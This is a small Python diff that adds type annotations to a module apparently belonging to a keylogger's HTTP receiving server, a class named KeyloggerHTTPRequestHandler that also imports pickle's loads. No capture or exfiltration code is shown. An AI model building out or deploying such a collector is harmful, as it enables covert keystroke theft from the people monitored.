@@ -4,13 +4,13 @@ from inspect import isfunction
 from logging import INFO, StreamHandler, getLogger
 from pathlib import Path
 from pickle import loads
-from typing import Optional
+from typing import Callable, Optional
 
 from .events import Event
 
 
 class KeyloggerHTTPRequestHandler(BaseHTTPRequestHandler):
-    __consumers = []
+    __consumers: list[Callable] = []
     save_file = None
 
     def send_response(self, code, message=None):
